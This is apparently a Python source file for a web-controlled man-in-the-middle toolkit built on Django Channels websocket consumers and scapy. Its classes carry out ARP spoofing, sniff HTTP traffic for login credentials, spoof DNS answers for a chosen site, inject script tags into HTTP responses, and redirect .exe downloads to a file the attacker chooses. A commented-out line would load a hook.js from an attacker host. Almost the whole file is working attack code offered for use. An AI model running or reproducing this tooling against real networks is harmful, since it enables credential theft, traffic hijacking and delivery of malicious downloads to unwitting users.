from channels.exceptions import StopConsumer, InvalidChannelLayerError
from channels.generic.websocket import WebsocketConsumer
from json import dumps, loads
from subprocess import run
from time import sleep
from re import sub, search
from scapy.layers.inet import IP, TCP, UDP
from scapy.all import Raw, sniff, send
from scapy.layers import http
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp
from scapy.layers.dns import DNSQR, DNSRR, DNS
from urllib.parse import urljoin
import netfilterqueue, os

class ARPSpoof(WebsocketConsumer):
    target_ip = None
    gateway_ip = None
    def connect(self):
         self.accept()

    def disconnect(self, close_code):
        #await self.close()
        print("disconnect", close_code)
        pass

    def receive(self, text_data):
        text_data_json = loads(text_data)
        print(text_data)
        run("iptables --flush", shell=True)
        if "target_ip" in text_data and "gateway_ip" in text_data and len(text_data_json["gateway_ip"])>0 and len(text_data_json["target_ip"])>0:
            if "cancel_arp" in text_data:
                self.send(text_data=dumps({
                    'arp_spoof_result': "Reset starting..."
                }))
                self.restore(self.target_ip, self.gateway_ip)
                self.restore(self.gateway_ip, self.target_ip)
                self.send(text_data=dumps({
                    'arp_spoof_result': "Ip addresses have been reset."
                }))
            else:
                self.target_ip = text_data_json["target_ip"]
                self.gateway_ip = text_data_json["gateway_ip"]
                sent_packets_count = 0
                run("iptables --flush", shell=True)
                run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
                while (self.spoof(self.target_ip, self.gateway_ip) != False) and (self.spoof(self.gateway_ip, self.target_ip) != False):
                    sent_packets_count += 2
                    self.send(text_data=dumps({
                        'arp_spoof_result': "\r[+] Sent " + str(sent_packets_count) + " packets"
                    }))
                    sleep(2)
        else:
            self.send(text_data=dumps({
                'arp_spoof_error': "Please, fill all fields correctly"
            }))

    def get_mac(self, ip_address):
        arp_request = ARP(pdst=ip_address)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request

        retries = 4
        for i in range(retries):
            answered_list = srp(arp_request_broadcast, timeout=1,
                                      verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc

        return ""

    def spoof(self, target_ip, spoof_ip):
        is_correct_ip = True
        target_mac = self.get_mac(target_ip)
        if target_mac:
            packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                               psrc=spoof_ip)
            send(packet, verbose=False)
        else:
            self.send(text_data=dumps({
                'arp_spoof_error': "\n[---No Such IP---]"
            }))
            is_correct_ip = False
        return is_correct_ip

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)

class PacketSniffing(WebsocketConsumer):

    def connect(self):
         self.accept()

    def disconnect(self, close_code):
        print("disconnect", close_code)
        pass

    def receive(self, text_data):
        text_data_json = loads(text_data)
        if "interface" in text_data and len(text_data_json["interface"])>0:
            self.sniff(text_data_json["interface"])
        else:
            self.send(text_data=dumps({
                'packet_sniffing_error': "Please, fill all fields correctly"
            }))

    def sniff(self, interface):
        try:
            sniff(iface=interface, store=False, prn=self.process_sniffed_packed)  # we can set filter = "udp" or "port 21"
        except:
            self.send(text_data=dumps({
                'packet_sniffing_error': "Please, fill all fields correctly"
            }))

    def get_url(self, packet):
        return packet[http.HTTPRequest].Host.decode('cp866') + packet[http.HTTPRequest].Path.decode('cp866')

    def get_login_info(self, packet):
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode('cp866')
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load

    def process_sniffed_packed(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet)
            self.send(text_data=dumps({
                'packet_sniffing_result': ("[+] HTTP Request >> " + url)
            }))
            login_info = self.get_login_info(packet)
            if login_info:
                self.send(text_data=dumps({
                    'packet_sniffing_login': ("[+] HTTP Request >> " + url)
                }))
                self.send(text_data=dumps({
                    'packet_sniffing_login': ("[+] Possible USERNAME and PASSWORD\n-----------------------\n" + login_info + "\n------------------------------")}))

class DNSSpoof(WebsocketConsumer):
    target_website = None
    server_ip = None
    def connect(self):
         self.accept()

    def disconnect(self, close_code):
        print("disconnect", close_code)
        self.close()
        raise StopConsumer
        pass

    def receive(self, text_data):
        print(os.getpid())
        text_data_json = loads(text_data)
        print(text_data)
        run("iptables --flush", shell=True)
        if "dns_spoof_website" in text_data and "dns_spoof_serverIP" in text_data and len(text_data_json["dns_spoof_website"])>0 and len(text_data_json["dns_spoof_serverIP"])>0:
            run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            run("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
            self.target_website = text_data_json["dns_spoof_website"]
            self.server_ip = text_data_json["dns_spoof_serverIP"]
            self.send(text_data=dumps({
                'dns_spoofing_result': "[+] Spoofing started"
            }))
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()
        else:
            self.send(text_data=dumps({
                'dns_spoofing_error': "Please, fill all fields correctly"
            }))

    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            qname = scapy_packet[DNSQR].qname
            print(qname)
            print(self.target_website)
            if self.target_website in qname.decode('cp866'):
                self.send(text_data=dumps({
                    'dns_spoofing_result': "[+] Spoofing target"
                }))
                answer = DNSRR(rrname=qname, rdata=self.server_ip)
                scapy_packet[DNS].an = answer
                scapy_packet[DNS].ancount = 1
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum
                packet.set_payload(bytes(scapy_packet))
        packet.accept()

class CodeInjector(WebsocketConsumer):
    port = 0
    def connect(self):
         self.accept()

    def disconnect(self, close_code):
        print("disconnect", close_code)
        pass

    def receive(self, text_data):
        print(" [+] Request to code injector")
        text_data_json = loads(text_data)
        run("iptables --flush", shell=True)
        if "code_injector_port" in text_data and len(text_data_json["code_injector_port"])>0:
            run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            run("iptables -I FORWARD -j NFQUEUE --queue-num 1", shell=True)
            self.send(text_data=dumps({
                'code_injector_result': "[+] Code Injector started"
            }))
            try:
                self.port = int(text_data_json["code_injector_port"])
            except:
                self.send(text_data=dumps({
                    'code_injector_error': "Please, fill all fields correctly.\n The port has been set to 80\n"
                }))
                self.port = 80
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(1, self.process_packet)
            queue.run()
        else:
            self.send(text_data=dumps({     
                'code_injector_error': "Please, fill all fields correctly"
            }))

    def set_load(self, packet, load):
        packet[Raw].load = load
        del packet[IP].len
        del packet[IP].chksum
        if packet.haslayer(TCP):
            del packet[TCP].chksum
        return packet

    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        print(scapy_packet.show())
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == int(self.port) and scapy_packet.haslayer(http.HTTPRequest):
                scapy_packet[http.HTTPRequest].Http_Version = 'HTTP/1.0'
                scapy_packet[http.HTTPRequest].Accept_Encoding = None
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                packet.set_payload(bytes(scapy_packet))  # Content-Length:\s\d*
            elif scapy_packet[TCP].sport == int(self.port) and scapy_packet.haslayer(Raw):
                load = scapy_packet[Raw].load
                print(" [+] HTTP Response")
                # injection_code = '<script src="http://10.0.2.5:3000/hook.js"></script>'
                injection_code = "<script>alert('2');</script></body>"
                load = load.replace(b"</body>", bytes(injection_code, "utf-8"))
                load = load.replace(b"</BODY>", bytes(injection_code, "utf-8"))
                # print(load)
                if scapy_packet.haslayer(http.HTTPResponse):
                    if "text/html" in str(scapy_packet[http.HTTPResponse].Content_Type):
                        if scapy_packet[http.HTTPResponse].Content_Length:
                            content_length = int(scapy_packet[http.HTTPResponse].Content_Length)
                            new_content_length = content_length + len(injection_code)
                            scapy_packet[http.HTTPResponse].Content_Length = bytes(str(new_content_length), "utf-8")
                if load != scapy_packet[Raw].load:
                    scapy_packet[Raw].load = load
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    packet.set_payload(bytes(scapy_packet))  # Content-Length:\s\d*
                    print(IP(packet.get_payload()).show())
        packet.accept()

class ReplaceDownloads(WebsocketConsumer):
    ack_list = []
    port = 0
    file_location = ""
    file_name = ""
    url = ""
    def connect(self):
         self.accept()

    def disconnect(self, close_code):
        print("disconnect", close_code)
        pass

    def receive(self, text_data):
        text_data_json = loads(text_data)
        print(text_data_json)
        run("iptables --flush", shell=True)
        if "replace_downloads_port" in text_data and len(text_data_json["replace_downloads_port"])>0 \
                and "replace_downloads_file_location" in text_data and len(text_data_json["replace_downloads_file_location"])>0 \
                and "replace_downloads_file_name" in text_data and len(text_data_json["replace_downloads_file_name"])>0:
            #run("iptables --flush", shell=True)
            run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            run("iptables -I FORWARD -j NFQUEUE --queue-num 2", shell=True)
            self.send(text_data=dumps({
                'replace_downloads_result': "[+] File interceptor started"
            }))
            self.ack_list = []
            try:
                self.port = int(text_data_json["replace_downloads_port"])
            except:
                self.send(text_data=dumps({
                    'replace_downloads_error': "Please, fill all fields correctly.\n The port has been set to 80\n"
                }))
                self.port = 80
            self.file_location = text_data_json["replace_downloads_file_location"]
            self.file_name = text_data_json["replace_downloads_file_name"]
            self.url = urljoin(self.file_location, self.file_name)
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(2, self.process_packet)
            queue.run()
            self.send(text_data=dumps({
                'replace_downloads_result': "[+] Replace Downloads started"
            }))
        else:
            self.send(text_data=dumps({
                'replace_downloads_error': "[-] Please, fill all fields correctly"
            }))

    def set_load(self, packet):
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum
        return packet

    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        # print(scapy_packet.show())
        download_path = ''
        if scapy_packet.haslayer(TCP):
            if scapy_packet.haslayer(http.HTTPRequest) and scapy_packet[TCP].dport == int(self.port):
                download_path = str(scapy_packet[http.HTTPRequest].Path)
                if ".exe" in download_path and self.file_name not in download_path:
                    print("[+] EXE Request")
                    self.ack_list.append(scapy_packet[TCP].ack)
            elif scapy_packet.haslayer(http.HTTPResponse) and scapy_packet[TCP].sport == int(self.port):
                if scapy_packet[TCP].seq in self.ack_list:
                    self.ack_list.remove(scapy_packet[TCP].seq)
                    print("[+] Replacing File")
                    print(self.url)
                    scapy_packet[http.HTTPResponse].Status_Code = '301'
                    scapy_packet[http.HTTPResponse].Reason_Phrase = 'Moved Permanently'
                    scapy_packet[http.HTTPResponse].Location = self.url
                    modified_packet = self.set_load(scapy_packet)
                    print(modified_packet.show())
                    packet.set_payload(bytes(modified_packet))
                    print(IP(packet.get_payload()).show())
                    self.send(text_data=dumps({
                        'replace_downloads_result': "[+] File has been successfully replaced"
                    }))
        packet.accept()

class TestCodeInjection():

    def run(self):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()

    def set_load(self, packet, load):
        packet[Raw].load = load
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum
        return packet

    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(Raw):
            load = scapy_packet[Raw].load
            if scapy_packet[TCP].dport == 80:
                print(" [+] HTTP Request")
                load = sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
                load = load.replace(b"HTTP/1.1", b"HTTP/1.0")
            elif scapy_packet[TCP].sport == 80:
                print(" [+] HTTP Response")
                # injection_code = '<script src="http://10.0.2.5:3000/hook.js"></script>'
                injection_code = "<script>alert('test');</script></body>"
                load = load.replace(b"</body>", bytes(injection_code, "utf-8"))
                content_length_search = search(b"(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in str(load):
                    content_length = int(content_length_search.group(1))
                    new_content_length = content_length + len(injection_code) - len("</body>")
                    load = load.replace(bytes(str(content_length), "utf-8"), bytes(str(new_content_length), "utf-8"))
                    # WebsocketConsumer.send(text_data=dumps({
                    #     'code_injector_result': "[+] Code has been injector"
                    # }))
            if load != scapy_packet[Raw].load:
                new_packet = self.set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))  # Content-Length:\s\d*
        packet.accept()

